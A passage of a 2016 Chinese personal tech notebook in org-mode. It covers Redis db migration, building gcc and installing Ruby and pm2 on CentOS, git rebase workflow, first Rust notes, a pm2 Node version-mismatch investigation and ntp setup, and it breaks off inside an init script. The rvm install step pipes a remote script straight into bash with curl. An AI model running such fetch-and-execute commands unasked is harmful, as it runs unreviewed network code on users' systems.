  locking_function(int mode, int n, const char *file, int line) is needed to perform locking on shared data structures. (Note that OpenSSL uses a number of global data structures that will be implicitly shared whenever multiple threads use OpenSSL.) Multi-threaded applications will crash at random if it is not set.

  locking_function() must be able to handle up to CRYPTO_num_locks() different mutex locks. It sets the n-th lock if mode & CRYPTO_LOCK, and releases it otherwise.
  #+end_quote
  引用自 [[https://www.openssl.org/docs/manmaster/crypto/threads.html][OpenSSL - Threads]]

  我的应用程序虽然是多线程，但是其实只有一个线程会同时使用 =OpenSSL= 和 =libcurl= （发起 =http= 请求），按照上面的说明似乎不会有问题才对，
  当然也可能是 =libcurl= 中有什么设定导致，不管怎么样，应用程序如果能够满足 =OpenSSL= 多线程安全要求，有百利而无一害。
  
* DONE 迁移redis库的某个db                                            :redis:
  CLOSED: [2016-01-21 Thu 18:00]

  在项目开始的时候，往往会把各种用途的数据放到一个 redis 实例中，如 db1 存放功能 A 的数据、db2 存放功能 B 的数据。

  当 redis 的压力上来了之后，往往需要将某个 db 迁移到其它的实例上，如果是整个实例进行迁移，通常会通过 Master-Slave 将数据同步到新机器，然后提升新机器上的 redis 为 Master。

  但是遇到只需要迁移 1 个 db 的数据到新的 redis 实例（该实例已有其它数据）的情况，就需要借助 redis 数据迁移工具了，这里介绍两个工具。

  假设要将 redis 的 db5 从 192.168.1.100 上的 redis 迁到 192.168.1.101 上的 db5。

** [[https://github.com/salimane/redis-tools][redis-copy.py]]

   使用 python 开发。
    
   - 安装
     
     #+begin_src sh
       sudo pip2 install redis
       wget https://github.com/salimane/redis-tools/raw/master/redis-copy.py
     #+end_src
     
   - 开始迁移
     
     #+begin_src sh
       python2 ./redis-copy.py --source=192.168.1.100:6379 --target=192.168.1.101:6379 --databases=5 --limit=1000000000
       python2 ./redis-copy.py --source=192.168.1.100:6379 --target=192.168.1.101:6379 --databases=5 --clean
     #+end_src

** [[https://github.com/yaauie/redis-copy][redis-copy]] （推荐）

   使用 ruby 开发。

   - 安装

     #+begin_src sh
       gem install redis-copy
     #+end_src

   - 开始迁移

     #+begin_src sh
       ~/.gem/ruby/2.3.0/bin/redis-copy 192.168.1.100:6379/5 192.168.1.101:6379/5
     #+end_src

** 比较
   
   [[https://github.com/salimane/redis-tools][redis-copy.py]] 在迁移过程中 db 号不能改变，需要在源 db 中临时写入大量簿记信息，最终也没有完全清簿记信息（mig:run 键）。
   默认一次运行迁移 10000 条记录，可以多次运行迁移后面的数据，也可以通过指定 --limit 为一个够大的数量一次性迁移。
   支持同时迁移多个 db 。

   [[https://github.com/yaauie/redis-copy][redis-copy]] 可以任意指定源、目的 db 号，不需要往 redis 写入簿记信息。

* DONE CentOS 6.4 上编译安装 gcc 5.2.0                                :linux:
  CLOSED: [2016-01-22 Fri 21:12]

  node.js 4.x 的第三方扩展编译时要求 gcc 版本为 4.8，但是 CentOS 6.4 仓库里的版本为 4.4.7，
  在生产环境从第三方仓库里安装最新版 gcc 又不放心，还是自已从源代码编译安装吧。
  
  - 下载 gcc 源代码

    #+begin_src sh
      wget http://mirror.lzu.edu.cn/gnu/gcc/gcc-5.2.0/gcc-5.2.0.tar.bz2
      tar xjvf gcc-5.2.0.tar.bz2
      cd gcc-5.2.0
    #+end_src

    官方的下载地址为 [[ftp://ftp.gnu.org/gnu/gcc/]] ，使用国内镜像 [[http://mirror.lzu.edu.cn/gnu/gcc]] 快很多。
    
    gnu 中国的 [[https://www.gnu.org/prep/ftp.html][镜像列表]]
    #+begin_quote
    Asia

        China
            http://mirror.hust.edu.cn/gnu/
            http://mirrors.ustc.edu.cn/gnu/
            ftp://mirrors.ustc.edu.cn/gnu/
            rsync://mirrors.ustc.edu.cn/gnu/
    #+end_quote

  - 安装依赖的包

    #+begin_src sh
      yum install gmp-devel mpfr-devel libmpc-devel
    #+end_src

    参考自 INSTALL 目录下的文档。

  - 编译安装

    #+begin_src sh
      ./configure --prefix=/opt/gcc-5.2.0 --disable-multilib &&\
      make &&\
      make -k check &&\
      make install
    #+end_src

    =--disable-multilib= 只编译 64 位。

    编译时间会耗时几个小时，这段时间最好去干点别的。

  - 切换gcc版本

    #+begin_src sh
      export PATH=/opt/gcc-5.2.0/bin:$PATH
      export LD_LIBRARY_PATH=/opt/gcc-5.2.0/lib64/:$LD_LIBRARY_PATH
    #+end_src

    或

    #+begin_src sh
      export CC=/opt/gcc-5.2.0/bin/gcc
      export CPP=/opt/gcc-5.2.0/bin/cpp
      export CXX=/opt/gcc-5.2.0/bin/c++
      export LD_LIBRARY_PATH=/opt/gcc-5.2.0/lib64/:$LD_LIBRARY_PATH
    #+end_src

  - 参考

    [[http://superuser.com/questions/381160/how-to-install-gcc-4-7-x-4-8-x-on-centos][yum - How to Install gcc 4.7.x/4.8.x on CentOS - Super User]]

    [[https://wiki.mikejung.biz/Gcc_CentOS][Gcc CentOS - How to compile gcc-4.8.2 on CentOS 6.6]]

* DONE CentOS 6.4 上安装 ruby 1.9.3                              :linux:ruby:
  CLOSED: [2016-01-22 Fri 21:12]

  CentOS 6.4 上仓库中的 Ruby 版本为 1.8.7 太旧了，[[https://github.com/yaauie/redis-copy][redis-copy]] 要求 Ruby 版本至少为 1.9.3。

  - 安装 rvm
    
    #+begin_src sh
      curl -L get.rvm.io | bash -s stable
    #+end_src

  - 安装 Ruby 1.9.3

    #+begin_src sh
      /usr/local/rvm/bin/rvm install 1.9.3
    #+end_src
    
   - 启用 Ruby 1.9.3

     #+begin_src js
       source /usr/local/rvm/scripts/rvm
       rvm use 1.9.3
     #+end_src

   - 安装 RubyGems

     #+begin_src sh
       rvm rubygems current
     #+end_src
     
   - RubyGems 官方源国内访问不稳定，换成淘宝的镜像
     
     #+begin_src sh
       gem sources --remove https://rubygems.org/
       gem sources -a https://ruby.taobao.org/
     #+end_src
     
   - 安装 [[https://github.com/yaauie/redis-copy][redis-copy]]

     #+begin_src sh
       gem install redis-copy
     #+end_src

     安装后程序路径为 /usr/local/rvm/gems/ruby-1.9.3-p551/bin/redis-copy

     启用 Ruby 1.9.3 后，redis-copy 可以直接运行。

  - 参考

    [[https://www.digitalocean.com/community/tutorials/how-to-install-ruby-on-rails-on-centos-6-with-rvm][How To Install Ruby on Rails on CentOS 6 with RVM | DigitalOcean]]

    [[https://ruby-china.org/topics/3705][手把手安装RVM以及为什么RVM is not a function » Topics » Ruby China]]

    [[http://www.jb51.net/article/49079.htm][淘宝网提供的国内RubyGems镜像简介和使用方法_ruby专题_脚本之家]]

* DONE pm2的日志管理                                                   :node:pm2:
  CLOSED: [2016-02-17 Wed 14:16]

  [[https://github.com/Unitech/pm2][pm2]] 自身的日志文件 ~/.pm2/pm2.log，下面讲的是 [[https://github.com/Unitech/pm2][pm2]] app（应用）的日志文件。

** 默认日志

   每个 app（应用） 会生成 instances*2 （实例数×2）个日志文件。

   - app 的标准输出日志文件 :: ~/.pm2/logs/<app name>-out-<instance id>.log

   - app 的错误输出日志文件 :: ~/.pm2/logs/<app name>-error-<instance id>.log
     
** 合并输出类型日志（-l）

   每个 app（应用） 会生成 instances+1 （实例数+1）个日志文件。

   - app 的日志文件 :: ~/.pm2/logs/<app name>-<instance id>.log

   不影响默认日志。

   - 可以指定合并输出类型的日志文件名（-l app.log）
     
     输出日志文件名为 app-<instance id>.log
     
** 合并实例日志（--merge-logs）

   同一 app（应用）的所有 instances（实例）日志文件放在一起。

   - app 的默认标准输出日志文件 :: ~/.pm2/logs/<app name>-out.log

   - app 的默认错误输出日志文件 :: ~/.pm2/logs/<app name>-error.log
     
   - app 的合并输出类型日志文件 :: ~/.pm2/logs/<app name>.log

** 禁止默认日志

   - 禁止默认的标准输出日志文件（-o /dev/null）
     
   - 禁止默认的错误输出日志文件（-e /dev/null）

** 示例：app 生成一个日志文件简化日志管理

   #+begin_src sh
     pm2 -n app -i 0 -l app.log -o /dev/null -e /dev/null --merge-logs start app.js
   #+end_src

   这样只会生成一个日志文件 app.log。

** 定期清理日志

   不建议使用 [[https://www.npmjs.com/package/pm2-logrotate][pm2-logrotate]] ，太多问题了（详见： [[http://blog.kankanan.com/article/63a75236-pm2-768465e55fd765874ef659275c0f.html#sec-1][控制pm2的日志文件大小]] ）。

   还是使用 logrotate 服务靠谱（参考 [[http://pm2.keymetrics.io/docs/usage/log-management/#setting-up-a-native-logrotate][Setting up a native logrotate]] [[http://huoding.com/2013/04/21/246][被遗忘的Logrotate | 火丁笔记]]）：

   =/etc/logrotate.d/pm2-root=
   #+begin_example
     /root/.pm2/pm2.log /root/.pm2/logs/*.log {
         daily
         size 1M
         rotate 10
         create 600 nobody nobody
         missingok
         notifempty
         compress
         sharedscripts
         copytruncate
     }
   #+end_example

* DONE git多人协作：维护干净的提交树                                    :git:
  CLOSED: [2016-02-21 Sun 13:14]

  很多开源项目是被强制要求维护干净的提交树，上游容易合并你通过 pull request 提交的补丁，要实现这一点，pull 代码时需要使用 rebase 替换默认的 merge 方式。

  #+begin_src sh
    git pull --rebase
  #+end_src

  git pull 时自动进行 rebase。
    
  - 全局开启

    #+begin_src sh
      git config --global pull.rebase true
    #+end_src
     
  - 当前分支开启
     
    #+begin_src sh
      git config branch.master.rebase true
    #+end_src

  现在，如果你的工作区有未提交的代码，是不允许 pull 的，需要 stash 将工作区清理一下，等 pull 完成再恢复一下。

  #+begin_src sh
    git stash
    git pull
    git stash pop
  #+end_src

  使用 rebase 模式相对来说麻烦一些，但是好处就是中心仓库的提交历史是线性的，特别是通过 pull request 提交补丁来协作开发的时候，接收方随时可以将补丁合并进来，完全没有 merge 模式合并补丁那么麻烦。强烈建议默认情况下使用这种模式。

* TODO 快乐去哪里了                                                      :反省:

  从什么时候开始，再也难以开怀大笑。
  需要被逗乐才会笑，所以没事就不自觉地找乐子，可能是笑点越来越低了，找来找去徒烦闷。
  需要被奖励才会满足，所以总想着努力付出会有回报，却难以从忙忙碌碌中找到存在感。
  以为有时间才会快乐，却没了寻找快乐的习惯，在自已的时间里，像一台暂停运行的机器，放在那里生锈。
  工作的时候想休假，休假的时候却担心自已荒废了时间，总想看点什么学点什么，忙得累闲得也累。
  
  那时候，我看了一部又一部电影。
  那时候，我追了一集又一集美剧。
  那时候，我看了一篇又一篇博客。
  那时候，我看了一篇又一篇评测。
  那时个，我看了一本又一本书。
  那时候，我逛了一个又一个空间。
  那时候，我淘了一个又一个宝贝。
  那时候，我玩了一夜又一夜游戏。
  
  我找到了一点快乐，但是很快就消失了，快乐为什么没有办法永恒，而要不断寻找。
* DONE 使用 pm2 管理应用                                               :node:pm2:
  CLOSED: [2016-02-25 Thu 15:18]

  pm2 是使用 node.js 开发的进程管理器，实现统一方式管理进程，如：崩溃后拉起、启动/停止、监控、日志管理等。

** 安装

   #+begin_src sh
     npm install pm2@latest -g
   #+end_src

*** 为什么要全局（global）方式安装 pm2？

    pm2 被设计成管理用户的全部应用，pm2 的数据保存在 ~/.pm2 目录下，同一用户只能启动一个 pm2 后台进程（PM2 daemon），不同用户的 pm2 互不影响。
    不安装为全局的情况下，如果安装多个版本的 pm2，不同版本的 pm2 前端工具程序与 pm2 后台进程（PM2 daemon）交互是有风险的。

** 应用管理

   - 启动应用

     #+begin_src sh
       pm2 start -n app1 app1.js
       pm2 start -n app2 app2.js
     #+end_src
     
   - 列出应用

     #+begin_src sh
       pm2 list
     #+end_src

   - 应用详情

     #+begin_src sh
       pm2 describe app1
     #+end_src
     
   - 停止应用

     #+begin_src sh
       pm2 stop app1
       pm2 stop app2
     #+end_src

   - 删除应用
     
     #+begin_src sh
       pm2 delete app1
       pm2 delete app2
     #+end_src
     
** 开机启动

   应用启动后需要保存，应用才会在开机后由 pm2 服务启动。

   #+begin_src sh
     pm2 save
   #+end_src

   创建 pm2 系统服务，开机启动 pm2

   #+begin_src sh
     sudo pm2 startup systemd -u app
   #+end_src

   不重启试运行一下，看是否正常
   
   #+begin_src sh
     # 清空进程并退出 pm2，回到干净的系统状态
     sudo systemctl stop pm2
     ps aux | grep node

     # 启动 pm2 服务，验证一下应用是否正常启动
     sudo systemctl start pm2
     pm2 list
   #+end_src

** 日志管理

   《 [[http://blog.kankanan.com/article/pm2-768465e55fd77ba17406.html][pm2的日志管理]] 》有详细描述。

** 多 node.js 版本共存

   pm2 本身就是 node.js 开发的程序，依赖 node.js，pm2 应用可以使用不同版本的 node.js。
   
   pm2 命令行工具会通过“#!/usr/bin/env node”方式引用 node，如果应用也以同样的方式引用 node.js，就要随时注意切换 node.js 版本，一不小心 pm2 命令行工具和 pm2 应用使用的 node.js 版本会错乱，有一定风险性。一个 node.js 版本安装的模块不能保证与另一个 node.js 版本兼容，特别是一些 c++ 扩展模块。

   我以前的实践中，应用会提供一个环境脚本 .bashrc ，在操作某个应用时，总是会通过 =source .bashrc= 先设置应用的 shell 环境变量，通过 $PATH 环境变量指定 node 命令为应用所需的 node.js 版本不是一个好主意，当操作 pm2 时，pm2 也会使用这个应用的 node.js 版本。
   
   从这一点上看，不应该使用 node.js 、php、python、ruby 之类的脚本语言来开发进程管理器，它本身的依赖管理就是个大麻烦，使用 go、c 或 c++ 来开发会好得多。
   
   理想情况下，pm2 和 应用（app）总是使用正确的 node.js 版本，可以归为以下三种情形。新应用应该总是假设布署环境为情形 1，不要过多考虑系统运行的 node.js 版本，这也就要求应用能够兼容各种 node.js 版本，但是现实情况是，node.js 以及 javascript 发展得太快了，应用依赖的各种 node.js 模块也往往做不到兼容各种 node.js 版本，很多模块基于实现的简洁性考虑，提供多个版本分别对应不同的 node.js 版本，导致应用也必须从一开始就选择特定的 node.js 版本，不同团队、人员及项目跟进新技术步调不一致时，情形 2 及情形 3 是现实的选择。

*** 情形 1：系统中只有一个 node.js 版本，并且是全局安装

    在专机专用的生产环境下，这种情形会很常见，特别是 docker 容器环境下。
     
    这是最简单的一种情况，不需要为 node.js 版本操心，整个开发组织在 node.js 版本选择上共进退，保持一致。

*** 情形 2：系统中有一个全局 node.js 版本，应用有自已的 node.js 版本

    开发环境下，或者同一机器部署大量微服务的情况下，一般就是这种情形。

    这是最复杂的一种情况，在运行应用代码的时候，要确保切到应用所需的 node.js 版本，在执行 pm2 操作的时候，要确保切到 pm2 所需的 node.js 版本，有如履薄冰的感觉。

    node.js 版本需要在以下方面正确匹配：

    - pm2 的 node.js 版本

      pm2 本身就是一套用户全局的进程管理工具，使用全局的 node.js 版本是自然而然的选择。

      否则就一定要记得使用正确的 node.js 版本运行 pm2：/usr/local/node-v5.0.0/bin/node pm2 list，很是不便。

    - 应用的 node.js 版本

      建议使用 =--interpreter= 选项指定 node.js 版本，参见讨论：[[https://github.com/Unitech/PM2/issues/1034][Using different versions of node via nvm for each app · Issue #1034 · Unitech/pm2]] 。
      
      警告：pm2 在 =cluster= 模式下， =--interpreter= 选项被忽略，详见：[[http://blog.kankanan.com/article/module-version-mismatch-95198bef639267e5.html][Module version mismatch 错误排查 | 看看俺 – KanKanAn.com]] 。
      
      这是最关键的一点，应用的 node.js 版本不对，可能导致应用启动失败，中断服务。

    - 应用的辅助脚本的 node.js 版本

      使用 node.js 开发的应用附带命令行工具运行时如果 node.js 版本不对，通常不会对运行中的服务造成影响。
      
      可以简单地写一些 shell 脚本封装，在 shell 脚本中指定正确的 node.js 版本，如：

      =dump.sh=
      #+begin_src sh
        #!/bin/bash

        /usr/local/node-v5.0.0/bin/node ./dump.js
      #+end_src
      
      也可以直接在 node.js 脚本中引用正确的 node.js 版本，如：

      =dump.js=
      #+begin_src js
        #!/usr/local/node-v5.0.0/bin/node

        var fs = require('fs');
        ...
      #+end_src

      #+begin_src sh
        chmod a+x dump.js
        ./dump.js
      #+end_src

*** 情形 3：系统没有全局 node.js 版本，应用各自维护 node.js 版本

    这是上面情况的简化版，考验开发、运维团队的纪律性。

    由于 $PATH 中没有 node.js，不会由于没有指定 node.js 绝对路径无意间引用错误的 node.js 版本。

    可以把 node.js 安装在应用根目录下，如下目录结构所示：

    #+begin_example
      Applications
      |
      |
      |--- Application 1
      |         |
      |         |--------- node
      |         |
      |         |--------- package.json
      |         |
      |         |--------- ...
      |
      |    
      |--- Application 2
      |         |
      |         |--------- node
      |         |
      |         |--------- package.json
      |         |
      |         |--------- ...
      |
      |
      |--- Application 3
      |         |
      |         |--------- node
      |         |
      |         |--------- package.json
      |         |
      |         |--------- ...
      |
    #+end_example

    甚至 pm2 也通过以上方式安装自已的 node.js 版本。

    通过 ./node/bin/node 引用 node.js 可执行程序，不要试图通过将 ./node/bin 目录加到 $PATH 中以简化使用，否则操作不同应用或 pm2 时，又会一不小心引用到错误的 node.js 版本。

** 参考

   [[http://pm2.keymetrics.io/docs/usage/pm2-doc-single-page/][PM2 - One page documentation]]

* DONE CentOS 6.4 生产环境上安装 pm2                             :node:pm2:linux:
  CLOSED: [2016-02-25 Thu 17:27]

  确保系统要干净（尚未安装 node.js），使用 root 帐号登录。

  - 安装 LTS 版的 node.js
    
    当前 [[https://nodejs.org/en/][官方]] 推荐的 LTS 版本为 v4.3.1，通过淘宝镜像下载速度快一些，直接安装在系统目录中 /usr 下，便于使用。
    
    #+begin_src sh
      wget http://npm.taobao.org/mirrors/node/latest-v4.x/node-v4.3.1-linux-x64.tar.xz -O node-v4.3.1-linux-x64.tar.xz
      tar xJvf node-v4.3.1-linux-x64.tar.xz --no-same-owner --exclude CHANGELOG.md --exclude LICENSE --exclude README.md --strip-components 1 -C /usr
    #+end_src

    参考：[[https://gist.github.com/TooTallNate/2477f53a23a51537332e][Install Node.js one-liner]]
    
  - 安装稳定版 pm2

    从 [[https://github.com/Unitech/pm2/blob/master/CHANGELOG.md][CHANGELOG.md]] 查到的当前的稳定版本为 v0.14.3，pm2 发布很频繁,不宜追新。

    #+begin_src sh
      npm install pm2@0.14.3 -g
    #+end_src

  - 设置 pm2 为开机启动

    #+begin_src sh
      pm2 startup centos
    #+end_src

  - 定期清理日志

    按《 [[http://blog.kankanan.com/article/pm2-768465e55fd77ba17406.html#sec-6][pm2的日志管理]] 》中的“定期清理日志”一节所述使用 logrotate 服务定期清理日志。

* DONE 计划学一门新语言：Rust                                          :rust:
  CLOSED: [2016-02-29 Mon 17:52]

  常常听到每年学一门新语言的建议，想想还是有道理的，可能主力开发语言还是一两种，但是拓宽视野才是关键。

  一开始比较倾向于 golang ，语言设计简单、后台硬，而且有很多杀手级应用。

  但是自已用 node.js 开发后台应用接近两年时间，除了部署时要下载一大堆包，并且包的兼容性变化较大这一点缺陷外，无论是开发效率和运行效率都合我意。再学一门应用领域差不多的 golang 有点动力不够。

  rust 看起来和手头上的语言差异较大，是一门严肃认真的语言，野心不小，反正也没指望立即拿它混饭吃，就暂定它吧。

  学习计划分为以下阶段：

  - 学习语言本身并做一些示例练习

    从 《Rust Programming Language》一书入手。

    预计用一部分 3、4 月份的业余时间。

  - 用于写一些对自已有用的临时性项目

    预计用一部分 5、6 月份的业余时间。

  - 参与一些开源项目

    预计 7 月份之后的时间吧。

  - 用于产品开发

    如果这门语言本身经得起考验的话，不排除在工作中的一些小项目上正式使用。

* DONE Rust 是 C++ 的继承者                                            :rust:
  CLOSED: [2016-02-29 Mon 19:35]

  刚看完《[[http://killercup.github.io/trpl-ebook/trpl-2015-09-26.html][Rust Programming Language]]》开头章节“A brief introduction to Rust”，第一个例子就可以看出它是 C++ 的继承者，相信每个 C++ 开发者会忍不住会心一笑。

  看以下代码
  #+begin_src rust
    fn main() {
        let mut x = vec!["Hello", "world"];

        let y = &x[0];

        x.push("foo");
    }
  #+end_src

  会编译出错
  #+begin_example
    error: cannot borrow `x` as mutable because it is also borrowed as immutable
          x.push("foo");
          ^
      note: previous borrow of `x` occurs here; the immutable borrow prevents
      subsequent moves or mutable borrows of `x` until the borrow ends
          let y = &x[0];
                   ^
      note: previous borrow ends here
      fn main() {
      
      }
      ^
  #+end_example

  可以这样修复
  #+begin_src rust
    fn main() {
        let mut x = vec!["Hello", "world"];

        let y = x[0].clone();

        x.push("foo");
    }
  #+end_src

  也可以这样修复
  #+begin_src rust
    fn main() {
        let mut x = vec!["Hello", "world"];

        {
            let y = &x[0];
        }

        x.push("foo");
    }
  #+end_src

  再多新颖的关键字也掩不住骨子里的 C++ 气息：作用域、引用，还有代码未明确表达的 “move语义”、RAII等。

  考虑到 Rust 宣称是一门“安全”、“高效”、“并发”的语言，消除了大量 C++ 的缺陷，对于一个掌握 C++ 的开发人员来说，语法形式上添加的繁琐不是问题，只要是经得起推敲那就是合理的。

  Rust 是由 [[https://github.com/servo/servo][Servo]] （浏览器引擎）项目驱动的，这导致现阶段 Rust 的定位是客户端系统软件开发，服务端高并发相关的需求被延后（如：异步I/O、协程），从这一点上看 Rust、Golang 其实是互补的。

  Rust 的主要特性：

  - 基本类型

    与 C++ 相似

  - 模板

    与 C++ 相似，更友好的错误信息

  - Trait

    Rust 语言级的支持，没有继承，通过 Trait 实现了运行时多态

  - RAII

  - 静态类型及自动类型推导
    
  - 模块化支持
    
  - 文档及测试

  - 宏

    Rust 的宏更安全，不同于 C++ 的基于文本的替换，Rust 的宏是语义完备的。

  - 安全优先

    Rust 设计上的主要考虑就是安全（Safety），如变量定义默认是 const 的，borrow checker，lifetime等,
    强大的编译期检测。

* DONE Archlinux 下搭建 Rust 开发环境                  :rust:archlinux:emacs:
  CLOSED: [2016-02-29 Mon 20:03]

  - Emacs 里安装 rust-mode

    M-x el-get-install rust-mode

  - Archlinux 安装 rust 相关包

    yaourt -S rust cargo

    安装的版本

    #+begin_example
      $ rustc --version
      rustc 1.6.0
      $ cargo --version
      cargo 0.8.0 (28a0cbb 2016-01-17)
    #+end_example

  - Hello world!

    =hello_world.rs=
    #+begin_src rust
      fn main() {
          println!("Hello, world!");
      }
    #+end_src

    编译运行
    #+begin_example
      $ rustc hello_world.rs 
      $ ./hello_world 
      Hello, world!
    #+end_example

  - 更多配置

    可以参考文章《[[http://bassam.co/emacs/2015/08/24/rust-with-emacs/][Configuring Emacs for Rust]]》进行更高级的配置，对于我这种 Rust 还没入门的人来说，前面的配置已经足够，还是一步一个脚印吧。

* DONE Module version mismatch 错误排查                                :node:pm2:
  CLOSED: [2016-03-02 Wed 15:41]

  node.js 应用启动时出现以下错误：
  #+begin_example
    Error: Cannot find module '../build/Debug/addon'
        at Function.Module._resolveFilename (module.js:339:15)
        at Function.Module._load (module.js:290:25)
        at Function._load (/usr/lib/node_modules/pm2/node_modules/pmx/lib/transaction.js:62:21)
        at Module.require (module.js:367:17)
        at require (internal/module.js:16:19)
        at Object.<anonymous> (node_modules/heapdump/lib/main.js:18:15)
        at Module._compile (module.js:413:34)
        at Object.Module._extensions..js (module.js:422:10)
        at Module.load (module.js:357:32)
        at Function.Module._load (module.js:314:12)
  #+end_example

  改了一下 heapdump/lib/main.js:18:15 附近的代码，输出了真正的错误信息：
  #+begin_example
    Error: Module version mismatch. Expected 47, got 46.
  #+end_example

  根据 node_version.h 中 NODE_MODULE_VERSION 的定义，46 对应 Node.js v4.0.0，47 对应 Node.js v5.0.0。
  应该是编译 heapdump 模块使用的 Node.js 版本和运行时 Node.js 版本不一致，编译时我通过 $PATH 环境变量，将 Node.js v4.2.3 置为默认的 Node.js 版本了。
  #+begin_example
    $ /usr/bin/node --version 
    v5.7.0
    $ node --version
    v4.2.3
  #+end_example

  我使用的是 pm2 做为进程管理器，cluster 模式运行 node.js 应用，pm2 后台进程使用的是默认版本的 Node.js 版本（v5.7.0）启动，应该是 pm2 也使用同样的 Node.js 版本（v5.7.0）来运行应用，执行 pm2 save 后，~/.pm2/dump.pm2 中我的应用的 $PATH 是正确的，已经将 Node.js v4.2.3 置为默认的 Node.js 版本，不知为何 pm2 并未采用。

  pm2 分为前端命令和后端 daemon 两部分，真正的操作都是由 daemon 来施行，当我们使用 pm2 start 来启动 app 时，只是把命令通过 unix socket 传递给了 daemon，一个合理的猜想是 pm2 命令并没有把当前 shell 的 $PATH 传递给 daemon，或者是 daemon 创建 app 进程时传递过来的 $PATH 设置未生效。

  查看当前的 pm2 版本：
  #+begin_example
    $ ps aux | grep PM2 | grep -v grep 
    tangxin+ 17538  0.1  0.4 1185564 32020 ?       Ssl  2月25   9:29 PM2 v0.14.5: God Daemon
  #+end_example

  通过 --interpreter 选项启动应用时指定 Node.js v4.2.3： --interpreter=/usr/local/node-v4.2.3/bin/node

  通过 pm2 delete 删除应用后再 start 应用，结果还是一样的错误，查看应用实际使用的 node 版本：
  #+begin_example
    $ ls -la /proc/22387/exe
    lrwxrwxrwx 1 tangxinfa tangxinfa 0 3月   2 14:00 /proc/22387/exe -> /usr/bin/node
  #+end_example
  使用的还是系统默认的 Node.js 版本 v5.7.0。

  经过测试，可以确认：
  #+begin_quote
  通过 --interpreter 指定其它 node 版本，在 cluster 模式下无效，fork 模式下有效。
  #+end_quote

  参见相关 Issues：
  
  - [[https://github.com/Unitech/PM2/issues/1575][interpreter ignored when using cluster mode · Issue #1575 · Unitech/pm2]]
  
  - [[https://github.com/Unitech/PM2/issues/1034][Using different versions of node via nvm for each app · Issue #1034 · Unitech/pm2]]

  - [[https://github.com/Unitech/PM2/issues/1224#issuecomment-99931316][--interpreter not applied? · Issue #1224 · Unitech/pm2]]


  查看 pm2 与 node.js 的源代码进一步确认该问题：
  
  - pm2 调用 cluster.fork 创建工作进程

    引用自 pm2/lib/God/ClusterMode.js
    #+begin_src js
      cluster.fork({pm2_env: JSON.stringify(env_copy)})
    #+end_src

  - cluster.fork 调用 child_process.fork 创建工作进程

    引用自 node/lib/cluster.js
    #+begin_src js
      return fork(cluster.settings.exec, cluster.settings.args, {
        env: workerEnv,
        silent: cluster.settings.silent,
        execArgv: execArgv,
        gid: cluster.settings.gid,
        uid: cluster.settings.uid
      });
    #+end_src

    根据 child_process.fork 的实现（见 node/lib/child_process.js），由于未传入 =execPath= 选项，会使用 =process.execPath= 的值，也就是会使用 pm2 后台进程的 node 可执行程序路径来创建工作进程。
  
  应该可以通过指定不同的 $PM2_HOME 环境变量，跑多套 pm2，各个 pm2 使用不同版本的 Node.js，多个 cluster 模式的 pm2 应用也就会使用不同版本 Node.js。

* DONE linux 系统时间同步                                             :linux:
  CLOSED: [2016-03-10 Thu 14:07]

  - ntp :: Network Time Protocol，即网络时间同步协议。

** 安装 ntp

   ntpdate 和 ntpd 通常包含在 ntp 软件包里，但有的系统是单独打包。

   ntpdate 命令用于直接同步时间。

   ntpd 服务用于平滑同步时间。

   #+begin_src sh
     yaourt -S ntp
   #+end_src

** 使用 ntpdate 命令同步时间

   ntpdate 命令用于强制性的将系统时间设置为 ntp 服务器时间，导致时钟跃变，可能会引起系统不稳定。

*** 手工同步一次

    带 -d 选项，调试运行，不修改本地时间
    #+begin_example +n -r
      # ntpdate -d s1a.time.edu.cn
       9 Mar 18:46:29 ntpdate[20537]: ntpdate 4.2.4p8@1.1612-o Fri Feb 22 11:23:28 UTC 2013 (1)
      Looking for host s1a.time.edu.cn and service ntp
      host found : 202.112.10.60
      transmit(202.112.10.60)
      receive(202.112.10.60)
      transmit(202.112.10.60)
      receive(202.112.10.60)
      transmit(202.112.10.60)
      receive(202.112.10.60)
      transmit(202.112.10.60)
      receive(202.112.10.60)
      transmit(202.112.10.60)
      server 202.112.10.60, port 123
      stratum 1, precision -20, leap 00, trust 000
      refid [PPS], delay 0.06285, dispersion 0.00003
      transmitted 4, in filter 4
      reference time:    da8a8b53.73391350  Wed, Mar  9 2016 19:45:23.450
      originate timestamp: da8a8b5c.3f42dc7c  Wed, Mar  9 2016 19:45:32.247
      transmit timestamp:  da8a7d86.32fde4c3  Wed, Mar  9 2016 18:46:30.199
      filter delay:  0.06323  0.06317  0.06299  0.06285 
               0.00000  0.00000  0.00000  0.00000 
      filter offset: 3542.028 3542.028 3542.028 3542.028
               0.000000 0.000000 0.000000 0.000000
      delay 0.06285, dispersion 0.00003
      offset 3542.028898  (ref:ntpdate_debug_offset)

       9 Mar 18:46:30 ntpdate[20537]: step time server 202.112.10.60 offset 3542.028898 sec
    #+end_example

    - 行 [[(ntpdate_debug_offset)]]  :: 本机时间比时间服务器慢了 3542.028898 秒

    不带 -d 选项，修改本地时间
    #+begin_example
      # ntpdate s1a.time.edu.cn
      ntpdate s1a.time.edu.cn
       9 Mar 19:51:51 ntpdate[20553]: step time server 202.112.10.60 offset 3542.052347 sec
    #+end_example

*** 定期自动同步时间

    长时间运行的系统，会与标准时间产生偏差，通过 crontab 每日运行一次

    =/etc/cron.daily/ntpdate=
    #+begin_src sh
      #!/bin/bash

      /usr/sbin/ntpdate s1a.time.edu.cn >/dev/null 2>&1
    #+end_src

    请记得为 =/etc/cron.daily/ntpdate= 添加可执行权限。

** 使用 ntpd 服务同步时间

   - ntpd :: Network Time Protocol (NTP) Daemon
             The ntpd program is an operating system daemon that synchronizes the system clock to remote NTP time servers or local reference clocks.


   ntpd 服务的配置文件为 /etc/ntp.conf 。

   ntpd 如果时间偏差过大（默认 1000 秒钟），ntpd 会输出错误到系统日志后退出，所以在服务启动前需要先同步好时间。

   某嵌入式系统上的 ntpd 服务脚本：

   =/etc/init.d/S49ntp=
   #+begin_src sh
     #! /bin/sh
     #
     # System-V init script for the openntp daemon
     #

     PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
     DESC="network time protocol daemon"
     NAME=ntpd
     DAEMON=/usr/sbin/$NAME
     NTPDATE_BIN=/usr/bin/ntpdate

     # Gracefully exit if the package has been removed.
     test -x $DAEMON || exit 0

     # Read config file if it is present.
     if [ -r /etc/default/$NAME ]
     then
         . /etc/default/$NAME
     fi

     case "$1" in
       start)
         if [ -x $NTPDATE_BIN ] ; then
             echo -n "Getting initial time via ntp"
             $NTPDATE_BIN $NTPDATE_OPTS $NTPSERVERS > /dev/null 2>&1
             echo "."
         fi

         echo -n "Starting $DESC: $NAME"
         start-stop-daemon -S -q -x $DAEMON
